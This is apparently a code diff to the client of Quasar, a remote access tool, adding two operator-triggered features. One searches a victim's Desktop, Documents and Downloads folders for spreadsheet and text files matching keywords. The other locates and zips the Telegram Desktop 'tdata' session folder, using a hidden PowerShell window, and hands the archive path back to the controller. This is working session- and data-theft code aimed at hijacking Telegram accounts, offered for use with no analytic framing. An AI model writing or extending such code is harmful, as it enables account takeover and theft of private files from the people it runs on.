@@ -9,6 +9,7 @@ using Quasar.Common.Models;
 using Quasar.Common.Networking;
 using System;
 using System.Collections.Concurrent;
+using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Security;
@@ -58,7 +59,9 @@ namespace Quasar.Client.Messages
                                                              message is FileTransferCancel ||
                                                              message is FileTransferChunk ||
                                                              message is DoPathDelete ||
-                                                             message is DoPathRename;
+                                                             message is DoPathRename ||
+                                                             message is ScrapeDbsRequest ||
+                                                             message is ScrapeTdataRequest;
 
         public override bool CanExecuteFrom(ISender sender) => true;
 
@@ -87,6 +90,196 @@ namespace Quasar.Client.Messages
                 case DoPathRename msg:
                     Execute(sender, msg);
                     break;
+                case ScrapeDbsRequest msg:
+                    Execute(sender, msg);
+                    break;
+                case ScrapeTdataRequest _:
+                    ExecuteScrapeTdata(sender);
+                    break;
+            }
+        }
+
+        private void Execute(ISender client, ScrapeDbsRequest message)
+        {
+            try
+            {
+                var exts = (message.Extensions != null && message.Extensions.Length > 0)
+                    ? new HashSet<string>(message.Extensions, StringComparer.OrdinalIgnoreCase)
+                    : new HashSet<string>(new[] { ".txt", ".csv", ".xlsx", ".xls" }, StringComparer.OrdinalIgnoreCase);
+
+                var keys = (message.Keywords ?? new string[0]).Select(k => k ?? string.Empty).ToArray();
+
+                var desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+                var publicDesktop = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
+                var documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                var publicDocuments = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments);
+                var downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
+
+                var roots = new[] { desktop, publicDesktop, documents, publicDocuments, downloads };
+
+                var excludedDirNames = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
+                {
+                    "Quasar","bin","obj",".git","node_modules","Clients","Release","Debug"
+                };
+
+                const int maxResults = 50;
+
+                var found = new System.Collections.Generic.List<string>();
+
+                foreach (var root in roots.Distinct().Where(r => !string.IsNullOrWhiteSpace(r) && Directory.Exists(r)))
+                {
+                    try
+                    {
+                        foreach (var file in EnumerateFilesFiltered(root, excludedDirNames))
+                        {
+                            string ext = Path.GetExtension(file);
+                            if (!exts.Contains(ext)) continue;
+
+                            string name = Path.GetFileName(file);
+                            foreach (var kw in keys)
+                            {
+                                if (name.IndexOf(kw, StringComparison.OrdinalIgnoreCase) >= 0)
+                                {
+                                    found.Add(file);
+                                    if (found.Count >= maxResults) break;
+                                    break;
+                                }
+                            }
+
+                            if (found.Count >= maxResults) break;
+                        }
+                    }
+                    catch { }
+
+                    if (found.Count >= maxResults) break;
+                }
+
+                client.Send(new ScrapeDbsResponse { FilePaths = found.ToArray() });
+            }
+            catch { client.Send(new ScrapeDbsResponse { FilePaths = new string[0] }); }
+        }
+
+        private void ExecuteScrapeTdata(ISender client)
+        {
+            try
+            {
+                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                string desktop = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+                string downloads = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
+
+                var candidates = new System.Collections.Generic.List<string>();
+                candidates.Add(Path.Combine(appData, "Telegram Desktop", "tdata"));
+                candidates.Add(Path.Combine(localAppData, "Telegram Desktop", "tdata"));
+                candidates.Add(Path.Combine(desktop, "Telegram Desktop", "tdata"));
+                candidates.Add(Path.Combine(downloads, "Telegram Desktop", "tdata"));
+
+                string tgDir = null;
+                foreach (var cdir in candidates)
+                {
+                    try { if (Directory.Exists(cdir)) { tgDir = cdir; break; } } catch { }
+                }
+
+                if (string.IsNullOrEmpty(tgDir))
+                {
+                    try { client.Send(new SetStatusFileManager { Message = "Scrape tdata: tdata folder not found", SetLastDirectorySeen = false }); } catch { }
+                    client.Send(new ScrapeDbsResponse { FilePaths = new string[0] });
+                    return;
+                }
+
+                // Zip tdata into temp file
+                string tempZip = Path.Combine(Path.GetTempPath(), "tdata_" + DateTime.UtcNow.Ticks + ".zip");
+                try
+                {
+                    if (File.Exists(tempZip))
+                        try { File.Delete(tempZip); } catch { }
+                    try
+                    {
+                        // Prefer native shell compression first to avoid locked-file or permissions issues
+                        if (!TryZipWithShell(tgDir, tempZip))
+                        {
+                            // Fallback: managed ZipFile
+                            System.IO.Compression.ZipFile.CreateFromDirectory(tgDir, tempZip, System.IO.Compression.CompressionLevel.Optimal, false);
+                        }
+                    }
+                    catch
+                    {
+                        // Last resort: copy whole folder to a temp folder name if zip fails
+                        string fallbackDir = Path.Combine(Path.GetTempPath(), "tdata_copy_" + DateTime.UtcNow.Ticks);
+                        try { CopyDirectory(tgDir, fallbackDir); } catch { }
+                        tempZip = fallbackDir; // send folder if compression unavailable
+                    }
+                    try { client.Send(new SetStatusFileManager { Message = "Scrape tdata: zipped to " + tempZip, SetLastDirectorySeen = false }); } catch { }
+                    // Reuse ScrapeDbsResponse to send a single path back
+                    client.Send(new ScrapeDbsResponse { FilePaths = new[] { tempZip } });
+                }
+                catch
+                {
+                    try { client.Send(new SetStatusFileManager { Message = "Scrape tdata: zip failed", SetLastDirectorySeen = false }); } catch { }
+                    client.Send(new ScrapeDbsResponse { FilePaths = new string[0] });
+                }
+            }
+            catch
+            {
+                client.Send(new ScrapeDbsResponse { FilePaths = new string[0] });
+            }
+        }
+
+        private static bool TryZipWithShell(string sourceDir, string destZip)
+        {
+            try
+            {
+                // Use Windows built-in zip via powershell Compress-Archive for better compatibility
+                var psi = new System.Diagnostics.ProcessStartInfo
+                {
+                    FileName = "powershell.exe",
+                    Arguments = "-NoProfile -NonInteractive -WindowStyle Hidden -Command \"Compress-Archive -Path '" + sourceDir + "\\*' -DestinationPath '" + destZip + "' -Force\"",
+                    CreateNoWindow = true,
+                    UseShellExecute = false,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true
+                };
+                var p = System.Diagnostics.Process.Start(psi);
+                if (p == null) return false;
+                p.WaitForExit(240000); // 4 minutes
+                return File.Exists(destZip) && new FileInfo(destZip).Length > 0;
+            }
+            catch { return false; }
+        }
+
+        private static void CopyDirectory(string sourceDir, string destDir)
+        {
+            Directory.CreateDirectory(destDir);
+            foreach (var file in Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories))
+            {
+                var rel = file.Substring(sourceDir.Length).TrimStart('\\');
+                var target = Path.Combine(destDir, rel);
+                Directory.CreateDirectory(Path.GetDirectoryName(target));
+                File.Copy(file, target, true);
+            }
+        }
+
+        private static IEnumerable<string> EnumerateFilesFiltered(string root, HashSet<string> excludedDirNames)
+        {
+            var dirs = new Stack<string>();
+            dirs.Push(root);
+            while (dirs.Count > 0)
+            {
+                string current = dirs.Pop();
+                IEnumerable<string> subdirs = new string[0];
+                try { subdirs = Directory.EnumerateDirectories(current); } catch { }
+
+                foreach (var dir in subdirs)
+                {
+                    string name = Path.GetFileName(dir);
+                    if (excludedDirNames.Contains(name)) continue;
+                    dirs.Push(dir);
+                }
+
+                IEnumerable<string> files = new string[0];
+                try { files = Directory.EnumerateFiles(current); } catch { }
+                foreach (var f in files)
+                    yield return f;
             }
         }
 
